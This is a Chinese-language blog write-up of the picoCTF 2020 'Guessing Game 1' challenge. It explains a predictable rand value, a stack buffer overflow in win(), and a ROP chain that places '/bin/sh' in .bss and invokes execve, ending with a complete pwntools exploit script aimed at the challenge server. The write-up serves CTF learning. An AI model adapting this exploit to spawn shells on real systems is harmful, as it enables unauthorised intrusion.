---
title: "picoCTF2020-Guessing-Game-1"
date: 2020-10-14
draft: false
tags: ["picoCTF", "CTF", "pwn"]
categories: ["picoCTF"]
---

這題目花了我好幾個小時

https://play.picoctf.org/events/3/challenges/challenge/90

## 開始

我們先看看 Makefile

```make
all:
  gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c
clean:
  rm vuln
```

這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got

看看 `do_stuff` 和 `get_random`

```c
long get_random() {
  return rand() % BUFSIZE;
}
int do_stuff() {
  long ans = get_random();
  ans = increment(ans);
  int res = 0;

  printf("What number would you like to guess?\n");
  char guess[BUFSIZE];
  fgets(guess, BUFSIZE, stdin);

  long g = atol(guess);
  if (!g) {
    printf("That's not a valid number!\n");
  } else {
    if (g == ans) {
      printf("Congrats! You win! Your prize is this print statement!\n\n");
      res = 1;
    } else {
      printf("Nope!\n\n");
    }
  }
  return res;
}

```

輸入用 `fgets`，沒有 Buffer Overflow

但 `rand` 沒有初始化，它的值一直是固定的

用 gdb 可以很快找到 `ans` 的值

![](/img/picoCTF2020-Guessing-Game-1/random_num.png)
`ans` 固定為 `84`

> 補注: 截圖沒有截到 `rax`，但是 `rax` 應是 84

可以進到 `win` 裡面了
![](/img/picoCTF2020-Guessing-Game-1/access_first_level.png)

## 決定攻擊手法

`win` 裡面有 Buffer Overflow，明明 `BUFSIZE` 只有 100，卻可以填 360 個字元

```c++
// BUFSIZE = 100
void win() {
  char winner[BUFSIZE];
  printf("New winner!\nName? ");
  fgets(winner, 360, stdin);
  printf("Congrats %s\n\n", winner);
}
```

找到 padding
![](/img/picoCTF2020-Guessing-Game-1/offset.png)

```python
payload = 'a'*120
```

問題來了，我們可以用什麼方法破解它?

1. Shellcode<br>
   不行，有開 NX
2. return to libc<br>
   它用 static link
3. Format string<br>
   printf 看起來不能利用
4. ROP<br>
   好像可以

**決定用 ROP**

## 編寫 ROP chain

使用 ROPgadget
找不到 `pop eax`，只有 `pop rax`
![](/img/picoCTF2020-Guessing-Game-1/cannot_find_pop_eax.png)

把 `/bin/sh` 放到 `.bss` 段

```python
payload += flat([pop_rax, buf, pop_rdx, '/bin', mov_drax_edx, \
                 pop_rax, buf+4, pop_rdx, '/sh\x00', mov_drax_edx])
```

system call execve 參數

- eax: 11
- ebx: 字串 `/bin/sh` 的位置
- ecx: 0
- edx: 0

```python
payload += flat([pop_rbx, buf, pop_rax, 11, pop_rdx, 0, int_0x80])
```

> rcx 找不到適合的 gadget，只好先不理它，反正它常常是 0

> 想知道更多 system call 用法，可以到這個網站
> https://syscalls.w3challs.com/?arch=x86

## 暫存器尺寸

原本以為沒事了，沒想到...
![](/img/picoCTF2020-Guessing-Game-1/reg_size_problem.png)
輸入的資料會黏在一起

我們輸入的是 32-bit，但卻用 64-bit 的暫存器，所以必須在資料後面加上 4 個`\x00`

如果你用 flat，可以在每個指令後面都加入一個 0

```python
flat([pop_rbx, 0, buf, 0, pop_rax, 0, 11, 0, pop_rdx, 0, 0, 0, int_0x80, 0])
```

## 成果

```python
from pwn import *

context.arch = 'i386'
#r = process('./vuln')
r = remote('jupiter.challenges.picoctf.org', 39936)

s = r.recvuntil('?\n')

r.sendline('84')

buf = 0x6bc3a0
pop_rax = 0x4163f4
pop_rbx = 0x400ed8
pop_rdx = 0x44a6b5
mov_drax_edx = 0x48dd72
mov_rax_rdx = 0x41b570
int_0x80 = 0x468fea

payload = 'a'*120
payload += flat([pop_rax, 0, buf, 0, pop_rdx, 0, '/bin',0 , mov_drax_edx, 0,
                 pop_rax, 0, buf+4, 0, pop_rdx, 0, '/sh\x00',0 , mov_drax_edx, 0])
payload += flat([pop_rbx, 0, buf, 0, \
                 pop_rax, 0, 11, 0, pop_rdx, 0, 0, 0, int_0x80, 0])
# 有夠醜

raw_input()

r.recvuntil('? ')
r.sendline(payload)

r.interactive()
```

![](/img/picoCTF2020-Guessing-Game-1/final.png)
